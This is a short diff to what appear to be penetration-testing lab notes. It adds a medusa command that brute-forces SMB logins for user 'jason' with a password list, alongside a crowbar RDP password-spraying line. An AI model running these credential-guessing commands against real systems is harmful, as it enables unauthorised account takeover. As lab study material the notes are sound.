@@ -17,5 +17,5 @@ crowbar -b rdp -s xx.xxx.xxx.xxx/32 -u johanna -C <full-mutated-password-list
 
 
 # medusa is also awesome for smb
-
+medusa -M smbnt -h 10.129.135.10 -u jason -P passwords.list
 ```
